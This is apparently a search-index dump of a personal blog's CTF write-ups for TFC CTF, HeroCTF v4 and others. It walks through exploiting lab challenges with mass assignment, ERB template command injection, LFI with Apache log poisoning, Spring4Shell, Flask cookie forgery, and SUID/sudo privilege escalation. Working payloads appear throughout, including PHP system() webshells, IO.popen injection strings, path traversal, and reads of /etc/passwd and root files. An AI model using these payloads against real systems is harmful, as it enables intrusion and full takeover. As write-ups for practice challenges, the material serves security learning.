case insensitive\nThe challenge provides a JSON file containing logs.\nThese logs and scenarios are designed to be real-ish, they\u0026rsquo;re simpler and given that the entire data set covers 1hr all malicious activity is conducted on a condensed time frame.\nSearching in the logs, I find a log generated by the webmail indicating that the password for the admin@shop.","title":"DownUnderCTF : Shop-Oi! Get out of there!"},{"content":"Statement: Do you have what it takes to be the admin?\nThe challenge provides us with the following source code : index.tsx\nimport type { GetServerSideProps, NextPage } from \u0026#34;next\u0026#34;; import type { User } from \u0026#34;@prisma/client\u0026#34;; import { prisma } from \u0026#34;../globals/prisma\u0026#34;; import { useState } from \u0026#34;react\u0026#34;; import { useRouter } from \u0026#34;next/router\u0026#34;; type Props = { users: (User \u0026amp; ( | { flag: string; isAdmin: true; } | { flag?: never; isAdmin: false; } ))[]; }; const Home: NextPage\u0026lt;Props\u0026gt; = ({ users }) =\u0026gt; { const [username, setUsername] = useState(\u0026#34;\u0026#34;); const router = useRouter(); const create = async () =\u0026gt; { await fetch(\u0026#34;/api/auth\u0026#34;, { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, }, method: \u0026#34;POST\u0026#34;, body: JSON.stringify({ username, }), }); await router.replace(router.asPath); }; return ( \u0026lt;div\u0026gt; \u0026lt;div\u0026gt;Create user:\u0026lt;/div\u0026gt; \u0026lt;input value={username} onChange={(event) =\u0026gt; setUsername(event.target.value)} /\u0026gt; \u0026lt;button onClick={create}\u0026gt;Create\u0026lt;/button\u0026gt; \u0026lt;div\u0026gt;Users:\u0026lt;/div\u0026gt; {users.map((user) =\u0026gt; ( \u0026lt;div key={user.id}\u0026gt; \u0026lt;div\u0026gt;Username: {user.username}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;Is admin? {user.isAdmin ? \u0026#34;yes\u0026#34; : \u0026#34;no\u0026#34;}\u0026lt;/div\u0026gt; {user.isAdmin \u0026amp;\u0026amp; \u0026lt;div\u0026gt;{user.flag}\u0026lt;/div\u0026gt;} \u0026lt;/div\u0026gt; ))} \u0026lt;/div\u0026gt; ); }; export default Home; export const getServerSideProps: GetServerSideProps\u0026lt;Props\u0026gt; = async ( context ) =\u0026gt; { const users = (await prisma.user.findMany()) as Props[\u0026#34;users\u0026#34;]; for (const user of users) { if (user.isAdmin) { user.flag = process.env.FLAG!; } } return { props: { users, }, }; }; The file auth.ts:\nimport { NextApiRequest, NextApiResponse } from \u0026#34;next\u0026#34;; import { prisma } from \u0026#34;../../globals/prisma\u0026#34;; export default async function handler( req: NextApiRequest, res: NextApiResponse ) { const body = req.body; await prisma.user.create({ data: body, }); return res.status(200).end(); And the file schema.prisma:\ngenerator client { provider = \u0026#34;prisma-client-js\u0026#34; } datasource db { provider = \u0026#34;sqlite\u0026#34; url = \u0026#34;file:./app.db\u0026#34; } model User { id String @id @default(uuid()) username String isAdmin Boolean @default(false) } Thanks to the source code made available, we can see that it is possible to add the value isAdmin with the value true in order to authenticate with administrator rights.\nWhen visiting the website and creating a user, the following information is returned:\nUsers: Username: Sanlokii Is admin? no With the Burp Suite tool, I will modify the POST request to add isAdmin value for get the flag!\nDefault POST request:\nPOST /api/auth HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49374 Content-Length: 23 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Content-Type: application/json Accept: */* Origin: http://01.linux.challenges.ctf.thefewchosen.com:49374 Referer: http://01.linux.challenges.ctf.thefewchosen.com:49374/ Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close {\u0026#34;username\u0026#34;:\u0026#34;Sanlokii\u0026#34;} Modified POST request:\nPOST /api/auth HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49374 Content-Length: 23 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Content-Type: application/json Accept: */* Origin: http://01.linux.challenges.ctf.thefewchosen.com:49374 Referer: http://01.linux.challenges.ctf.thefewchosen.com:49374/ Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close {\u0026#34;username\u0026#34;:\u0026#34;Sanlokii\u0026#34;,\u0026#34;isAdmin\u0026#34;:true} The website get back the flag with this POST request.\nFlag: TFCCTF{S4n1t1z3_Y0ur_1nput5!}\n","permalink":"https://sanlokii.eu/writeups/tfc-ctf/are-you-the-admin/","summary":"Statement: Do you have what it takes to be the admin?\nThe challenge provides us with the following source code : index.tsx\nimport type { GetServerSideProps, NextPage } from \u0026#34;next\u0026#34;; import type { User } from \u0026#34;@prisma/client\u0026#34;; import { prisma } from \u0026#34;../globals/prisma\u0026#34;; import { useState } from \u0026#34;react\u0026#34;; import { useRouter } from \u0026#34;next/router\u0026#34;; type Props = { users: (User \u0026amp; ( | { flag: string; isAdmin: true; } | { flag?","title":"TFC CTF : Are you the admin?"},{"content":"Statement: My intern configured my iOS app and my website to handle deeplinks, but they didn\u0026rsquo;t tell me the path :( Can you help me find it?\nThe challenge announcement tells us about link and iOS.\nOnce on the website, it says nothing to see here.\nAfter some research, I find the following source: https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting/ios-universal-links#retrieving-the-apple-app-site-association-file\nTry to retrieve the apple-app-site-association file from the server using the associated domains you got from the previous step. This file needs to be accessible via HTTPS, without any redirects, at https:///apple-app-site-association or https:///.well-known/apple-app-site-association.\nSo I add the path /.well-known/apple-app-site-association to the URL of the exposed web server: http://01.linux.challenges.ctf.thefewchosen.com:50411/.well-known/apple-app-site-association\nWe get the file apple-app-site-association with the following content:\n{ \u0026#34;applinks\u0026#34;: { \u0026#34;apps\u0026#34;: [], \u0026#34;details\u0026#34;: [ { \u0026#34;appID\u0026#34;: \u0026#34;ABCDEFGHIJ.com.example.example\u0026#34;, \u0026#34;paths\u0026#34;: [\u0026#34;TFCCTF{4ppl3_4pp_51t3_4550c14t10n}\u0026#34;] } ] } } Flag: TFCCTF{4ppl3_4pp_51t3_4550c14t10n}\n","permalink":"https://sanlokii.eu/writeups/tfc-ctf/deeplinks/","summary":"Statement: My intern configured my iOS app and my website to handle deeplinks, but they didn\u0026rsquo;t tell me the path :( Can you help me find it?\nThe challenge announcement tells us about link and iOS.\nOnce on the website, it says nothing to see here.\nAfter some research, I find the following source: https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting/ios-universal-links#retrieving-the-apple-app-site-association-file\nTry to retrieve the apple-app-site-association file from the server using the associated domains you got from the previous step.","title":"TFC CTF : Deeplinks"},{"content":"Statement: Write something nice that passes our filter.\nOnce on the website, it\u0026rsquo;s indicates that somes regex are set !\nAfter some tests on the website and via the name of the challenge, I know that the site is written in Ruby.\nThe web server sends back via the headers the following information: WEBrick/1.6.1 (Ruby/2.7.5/2021-11-24)\nFollowing a long search, I found the following resources that will help me to exploit this flaw in order to bypass the regex.\nhttps://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/ http://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html A few tries after, I notice that the regex only let the characters [a-zA-Z0-9] through.\nThanks to the above resources, I will modify my HTTP POST request to inject a newline %0A in order to perform a command injection if the regex configuration is wrong.\nDefault POST request:\nPOST / HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49396 Content-Length: 7 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://01.linux.challenges.ctf.thefewchosen.com:49396 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://01.linux.challenges.ctf.thefewchosen.com:49396/ Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close input=x Modified POST request:\nPOST / HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49396 Content-Length: 7 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://01.linux.challenges.ctf.thefewchosen.com:49396 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://01.linux.challenges.ctf.thefewchosen.com:49396/ Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close input=x%0A {} I see that the regex is well bypassed with this payload !\nVia the following payload, I can inject commands:\ninput=x%0A %3C%25%3D%20IO.popen%28%27ls%20-ah%20.%20%2F%27%29.readlines%28%29%20%20%25%3E I just have to adapt the payload to get the flag:\ninput=x%0A %3C%25%3D%20IO.popen%28%27cat%20flag.txt%27%29.readlines%28%29%20%20%25%3E Flag: TFCCTF{02718f35dddc266e0ac40c0c0dcc98c34edd545678dc752ba9831b6d73bc706f}\nBy curiosity, I recovered the contents of the file input.rb to see the configured regex:\nrequire \u0026#39;sinatra/base\u0026#39; class Animated_template \u0026lt; Sinatra::Base configure do set: views, app / views set: public_dir, public end get \u0026#39;/\u0026#39; do @input = \u0026#34;Write something nice here that passes our regex\u0026#34; erb: \u0026#39;index\u0026#39; end post \u0026#39;/\u0026#39; do if params[: input] = ~/^[0-9a-z ]+$/i @input = ERB.new(params[: input]).result(binding) else @input = \u0026#34;That is far away from nice !!\u0026#34; end erb: \u0026#39;index\u0026#39; end get \u0026#39;/style.css\u0026#39; do erb: \u0026#39;style\u0026#39; end end ","permalink":"https://sanlokii.eu/writeups/tfc-ctf/diamonds/","summary":"Statement: Write something nice that passes our filter.\nOnce on the website, it\u0026rsquo;s indicates that somes regex are set !\nAfter some tests on the website and via the name of the challenge, I know that the site is written in Ruby.\nThe web server sends back via the headers the following information: WEBrick/1.6.1 (Ruby/2.7.5/2021-11-24)\nFollowing a long search, I found the following resources that will help me to exploit this flaw in order to bypass the regex.","title":"TFC CTF : Diamonds"},{"content":"Statement: Flag Format : TFCCTF{} The flag file has a random name and it\u0026rsquo;s in a random location .\nOn the website, we quickly detect an LFI flaw with the include logs so in order to confirm the flaw, I will get the /etc/passwd file.\nhttp://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/etc/passwd Now I\u0026rsquo;m looking to see if we have access to the web server log files to perform a log poisoning attack.\nI see that we can read the contents of the file /var/log/apache2/access.log:\nhttp://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log So I will modify my HTTP request to add the payload \u0026lt;?php system($_GET['cmd']); ?\u0026gt; in the user agent:\nGET /?file=/var/log/apache2/access.log HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49412 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close Now, I just have to add \u0026amp;cmd= as a parameter to my query in order to perform RCE:\nhttp://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log\u0026amp;cmd=id Like expected, I see the output of the command in user agent:\n[30/Jul/2022:12:33:33 +0000] \u0026#34;GET /?file=/var/log/apache2/access.log HTTP/1.1\u0026#34; 200 772 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 uid=33(www-data) gid=33(www-data) groups=33(www-data) Safari/537.36\u0026#34; I list the contents of the / directory to search the location of the flag:\nhttp://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log\u0026amp;cmd=ls%20/ [30/Jul/2022:12:33:33 +0000] \u0026#34;GET /?file=/var/log/apache2/access.log HTTP/1.1\u0026#34; 200 772 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 bin boot dev etc hidden_fl4g.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var Safari/537.36\u0026#34; And get the content of the file hidden_fl4g.txt :\nhttp://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log\u0026amp;cmd=cat%20/hidden_fl4g.txt 30/Jul/2022:12:33:33 +0000] \u0026#34;GET /?file=/var/log/apache2/access.log HTTP/1.1\u0026#34; 200 772 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3} Safari/537.36\u0026#34; Flag: TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3}\n","permalink":"https://sanlokii.eu/writeups/tfc-ctf/include-what-matters/","summary":"Statement: Flag Format : TFCCTF{} The flag file has a random name and it\u0026rsquo;s in a random location .\nOn the website, we quickly detect an LFI flaw with the include logs so in order to confirm the flaw, I will get the /etc/passwd file.\nhttp://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/etc/passwd Now I\u0026rsquo;m looking to see if we have access to the web server log files to perform a log poisoning attack.\nI see that we can read the contents of the file /var/log/apache2/access.","title":"TFC CTF : Include what matters"},{"content":"Statement: Oook! That\u0026rsquo;s a hard one! I just want to buy some tubes, but I think that the main site is disabled\u0026hellip; What now?\nFor this challenge, the website has nothing interesting except the information in the footer:\n\u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;For the complete functionality of the page add the following entries to your DNS configuration and use tube.com:PORT to connect to the platform.\u0026lt;br\u0026gt; 34.65.33.171 tube.com\u0026lt;br\u0026gt; 34.65.33.171 legacy.tube.com\u0026lt;br\u0026gt; DO NOT USE THIS IN PRODUCTION!\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; I add on my local machine in the file /etc/hosts the following entries:\n34.65.33.171\ttube.com 34.65.33.171\tlegacy.tube.com Now, the website with the domain name legacy.tube.com seems interesting. We can see in the HTML source code the following comment:\n\u0026lt;!-- Important! Due to the recent discovery of a major vulnerability of the used framework, this platform is now deprecated (more information at /info). It remains available only for backward compatibility reasons. DO NOT USE THIS PLATFORM IN PRODUCTION! --\u0026gt; So I go to the following URL: http://legacy.tube.com:49445/info\nDEVELOPER: Mark Doe FRAMEWORK: spring-boot TAG: COMPROMISED DATE: 30.03.2022 CURRENT_STATUS: patch in devlopment This page tells us that the spring-boot version is compromised.\nAfter some research, I find a git repo to get a webshell with spring4shell exploit.\nPOC of exploit :\npython exploit.py --url \u0026#34;http://legacy.tube.com:49445\u0026#34; ──(dim.,juil.31)─┘ [*] Resetting Log Variables. [*] Response code: 200 [*] Modifying Log Configurations [*] Response code: 200 [*] Response Code: 200 [*] Resetting Log Variables. [*] Response code: 200 [+] Exploit completed [+] Check your target for a shell [+] File: shell.jsp [+] Shell should be at: http://legacy.tube.com:49445/shell.jsp?cmd=id By going to the given URL, we can perform RCE with the parameter cmd:\nuid=1000(ctf) gid=1000(ctf) groups=1000(ctf) // A ls\u0026amp;cat allows us to get back the flag.\nFlag : TFCCTF{F*_$pr1nG!_I_m_m0R3_0f_4_w1nt3r_p3r$0n_aNyw4y!}\n","permalink":"https://sanlokii.eu/writeups/tfc-ctf/tubeinc/","summary":"Statement: Oook! That\u0026rsquo;s a hard one! I just want to buy some tubes, but I think that the main site is disabled\u0026hellip; What now?\nFor this challenge, the website has nothing interesting except the information in the footer:\n\u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;For the complete functionality of the page add the following entries to your DNS configuration and use tube.com:PORT to connect to the platform.\u0026lt;br\u0026gt; 34.65.33.171 tube.com\u0026lt;br\u0026gt; 34.65.33.171 legacy.tube.com\u0026lt;br\u0026gt; DO NOT USE THIS IN PRODUCTION!","title":"TFC CTF : Tubeinc"},{"content":"Statement: The website developer made a small mistake in the code of his website.\nCan you identify and exploit it to extract the flag?\nThe challenge makes the source code available to us:\n#!/usr/bin/env python from flask import Flask, session, render_template from string import hexdigits from random import choice from os import getenv app = Flask(__name__) app.secret_key = choice(hexdigits) * 32 @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): flag = \u0026#34;You are not admin !\u0026#34; if session and session[\u0026#34;username\u0026#34;] == \u0026#34;admin\u0026#34;: flag = getenv(\u0026#34;FLAG\u0026#34;) return render_template(\u0026#34;index.html\u0026#34;, flag=flag) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=int(getenv(\u0026#34;PORT\u0026#34;))) Thanks to the source code, the following information can be found:\nA misconfiguration was made on the key generation on app.secret_key = choice(hexdigits) * 32 If we rerun the python code, we can see that the generated key is the concatenation of the same hexdigit 32 times:\n\u0026gt;\u0026gt;\u0026gt; from string import hexdigits \u0026gt;\u0026gt;\u0026gt; from random import choice \u0026gt;\u0026gt;\u0026gt; choice(hexdigits) * 32 \u0026#39;00000000000000000000000000000000\u0026#39; This means that the key can only be composed of 16 different combinations\nThe session cookie must be composed of the value username:admin if session and session[\u0026#34;username\u0026#34;] == \u0026#34;admin\u0026#34;: flag = getenv(\u0026#34;FLAG\u0026#34;) With this information, we just have to generate the cookie and sign it with the 16 different combinations with flask-unsign.\nAfter a few tries, we get the right cookie:\nflask-unsign --sign --cookie \u0026#34;{\u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;}\u0026#34; --secret \u0026#39;22222222222222222222222222222222\u0026#39; --no-literal-eval Command output :\neyJ1c2VybmFtZSI6ImFkbWluIn0.YpHUjg.1ZdkOHPQaY8nzDyBfMXlmQlSFgI We just have to go to the web interface, add the cookie and get the flag !\nFlag : Hero{Sm4ll_Mist4ke_c4n_be_d4ngerous_10853085}\n","permalink":"https://sanlokii.eu/writeups/heroctf-v4/smallmistakebigmistake/","summary":"Statement: The website developer made a small mistake in the code of his website.\nCan you identify and exploit it to extract the flag?\nThe challenge makes the source code available to us:\n#!/usr/bin/env python from flask import Flask, session, render_template from string import hexdigits from random import choice from os import getenv app = Flask(__name__) app.secret_key = choice(hexdigits) * 32 @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): flag = \u0026#34;You are not admin !","title":"HeroCTF v4 : SmallMistakeBigMistake"},{"content":"Statement: You have been recruited by the CEO of Hero \u0026amp; Co. to test their security. But before handing you out the assignement, the asked you have to prove yourself, and escalate your privileges on this test system all the way to root.\nThe base credentials are: user1:password123\nOnce connected to the env with the default credentials, I start by listing the files in the home directory:\n# user1@d9551dfad93a:~$ ls -alh total 928K drwxr-xr-x 1 user1 user1 4.0K May 28 08:24 . drwxr-xr-x 1 root root 4.0K May 28 02:58 .. lrwxrwxrwx 1 root root 9 May 28 02:58 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 user1 user1 220 May 28 02:58 .bash_logout -rw-r--r-- 1 user1 user1 3.7K May 28 02:58 .bashrc drwx------ 2 user1 user1 4.0K May 28 08:22 .cache -rw-r--r-- 1 user1 user1 807 May 28 02:58 .profile -rw-rw-r-- 1 user1 user1 165 May 28 08:24 .wget-hsts -rwsr-sr-x 1 user2 user2 894K May 28 02:51 hmmm We can see that user1 can execute the SUID binary hmmm owned by user2.\nSo I run the binary to see what happens:\n# user1@d9551dfad93a:~$ ./hmmm Not sure why, but I\u0026#39;m gonna set my ruid to my uid. Not sure why, but I\u0026#39;m gonna run the \u0026#39;WTFFFFF\u0026#39; program right now. sh: 1: ./WTFFFFF: not found We can see that the binary tries to execute the ./WTFFFFF file with the relative path.\nSo I decide to copy /bin/bash in the home, rename it WTFFFFF and execute it to privesc to user2:\n# user1@d9551dfad93a:~$ cp /bin/bash ./WTFFFFF # user1@d9551dfad93a:~$ ./hmmm Not sure why, but I\u0026#39;m gonna set my ruid to my uid. Not sure why, but I\u0026#39;m gonna run the \u0026#39;WTFFFFF\u0026#39; program right now. # user2@d9551dfad93a:~$ id uid=1001(user2) gid=1000(user1) groups=1000(user1) Once on the user2 shell, I list the authorized commands in /etc/sudoers:\n# user2@d9551dfad93a:/home/user2$ sudo -l Matching Defaults entries for user2 on d9551dfad93a: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user2 may run the following commands on d9551dfad93a: (root) NOPASSWD: /usr/games/cowsay I go to GTFOBins and I see that it is possible to privesc with the binary cowsay.\nI just have to reproduce the PoC:\n# user2@d9551dfad93a:/tmp$ TF=$(mktemp) # user2@d9551dfad93a:/tmp$ echo \u0026#39;exec \u0026#34;/bin/bash\u0026#34;;\u0026#39; \u0026gt;$TF # user2@d9551dfad93a:/tmp$ sudo /usr/games/cowsay -f $TF x # root@d9551dfad93a:/tmp# id uid=0(root) gid=0(root) groups=0(root) Now root, I can cat the flag in /root :\n# root@d9551dfad93a:/tmp# cat /root/flag.txt\tHero{B4ck_2_b4s1cs} Flag: Hero{B4ck_2_b4s1cs}\n","permalink":"https://sanlokii.eu/writeups/heroctf-v4/undercover1/","summary":"Statement: You have been recruited by the CEO of Hero \u0026amp; Co. to test their security. But before handing you out the assignement, the asked you have to prove yourself, and escalate your privileges on this test system all the way to root.\nThe base credentials are: user1:password123\nOnce connected to the env with the default credentials, I start by listing the files in the home directory:\n# user1@d9551dfad93a:~$ ls -alh total 928K drwxr-xr-x 1 user1 user1 4.","title":"HeroCTF v4 : Undercover#1"},{"content":"Statement: Now that you proved yourself, You have to assess the security of one of their developpers systems. He\u0026rsquo;s a very good coder, but not that good at keeping his system safe. Could you report to us any vulnerabilities you find in his system?\nThe base credentials are: user1:password123\nOnce connected, I start by searching for a local vulnerability with linpeas:\nuser1@1e2ce5f20fec:/tmp$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \u0026amp;\u0026amp; chmod +x linpeas.sh user1@1e2ce5f20fec:/tmp$ ./linpeas.sh Through this, I notice several points:\nThe apache2 service is running with the dev user: root 1 0.0 0.0 18388 3080 ? Ss 10:56 0:00 /bin/bash /root/start.sh root 7 0.0 0.0 4640 876 ? S 10:56 0:00 /bin/sh /usr/sbin/apachectl -D FOREGROUND root 11 0.0 0.1 327136 21108 ? S 10:56 0:00 _ /usr/sbin/apache2 -D FOREGROUND dev 12 0.0 0.0 331536 11056 ? S 10:56 0:00 _ /usr/sbin/apache2 -D FOREGROUND dev 13 0.0 0.0 331536 11056 ? S 10:56 0:00 _ /usr/sbin/apache2 -D FOREGROUND dev 14 0.0 0.0 331536 11056 ? S 10:56 0:00 _ /usr/sbin/apache2 -D FOREGROUND dev 15 0.0 0.0 331536 11056 ? S 10:56 0:00 _ /usr/sbin/apache2 -D FOREGROUND dev 16 0.0 0.0 331536 11056 ? S 10:56 0:00 _ /usr/sbin/apache2 -D FOREGROUND root 10 0.0 0.0 72312 5776 ? S 10:56 0:00 /usr/sbin/sshd -D user1 28 0.0 0.0 103864 3480 ? S 10:57 0:00 _ sshd: user1@pts/0 user1 29 0.0 0.0 20368 3952 pts/0 Ss 10:57 0:00 _ -bash user1 41 1.2 0.0 5480 2700 pts/0 S+ 11:00 0:00 _ /bin/sh ./linpeas.sh user1 2838 0.0 0.0 5480 968 pts/0 S+ 11:00 0:00 _ /bin/sh ./linpeas.sh user1 2841 0.0 0.0 36164 3340 pts/0 R+ 11:00 0:00 | _ ps fauxwww user1 2842 0.0 0.0 5480 968 pts/0 S+ 11:00 0:00 _ /bin/sh ./linpeas.sh The /var/www/html directory is read/write for everyone: drwxrwxrwx 1 root root 4096 Apr 8 10:48 /var/www/html So I decide to create a shell.php in /var/www/html/ with the following content in order to execute commands through the cmd parameter with the rights of the dev user:\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;\u0026lt;?php echo basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;]); ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php if(isset($_GET[\u0026#39;cmd\u0026#39;])) { system($_GET[\u0026#39;cmd\u0026#39;]); } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt;document.getElementById(\u0026#34;cmd\u0026#34;).focus();\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; I check that the commands are executed with the user dev:\n# user1@1e2ce5f20fec:/var/www/html$ curl localhost/shell.php?cmd=id \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;shell.php\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; uid=1000(dev) gid=1000(dev) groups=1000(dev) \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt;document.getElementById(\u0026#34;cmd\u0026#34;).focus();\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; I check if the dev user has any authorized commands via sudo:\n# user1@1e2ce5f20fec:/var/www/html$ curl localhost/shell.php?cmd=sudo%20-l \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;shell.php\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; Matching Defaults entries for dev on 1e2ce5f20fec: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dev may run the following commands on 1e2ce5f20fec: (ALL) NOPASSWD: ALL \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt;document.getElementById(\u0026#34;cmd\u0026#34;).focus();\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; We can see the value (ALL) NOPASSWD: ALL, which means that we can execute all sudo commands without password.\nI just have to get the flag in the root directory:\nuser1@1e2ce5f20fec:/var/www/html$ curl localhost/shell.php?cmd=sudo%20cat%20/root/flag.txt \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;shell.php\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; Hero{3w-d4ta_1s_n0t_us3l3s5}\u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt;document.getElementById(\u0026#34;cmd\u0026#34;).focus();\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Flag: Hero{3w-d4ta_1s_n0t_us3l3s5}\n","permalink":"https://sanlokii.eu/writeups/heroctf-v4/undercover2/","summary":"Statement: Now that you proved yourself, You have to assess the security of one of their developpers systems. He\u0026rsquo;s a very good coder, but not that good at keeping his system safe. Could you report to us any vulnerabilities you find in his system?\nThe base credentials are: user1:password123\nOnce connected, I start by searching for a local vulnerability with linpeas:\nuser1@1e2ce5f20fec:/tmp$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \u0026amp;\u0026amp; chmod +x linpeas.sh user1@1e2ce5f20fec:/tmp$ ./linpeas.sh Through this, I notice several points:","title":"HeroCTF v4 : Undercover#2"},{"content":"Statement: Did you check out my blog posts?\nBrowsing the blog, we can see that each article is passed as an argument to the file parameter.\nSo I decide to try to exploit LFI to retrieve files stored on the web server.\nI start by retrieving the value of the /etc/passwd file to test if the server is vulnerable:\nhttp://ez.ctf.cafe:9999/blog-posts.php?file=../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 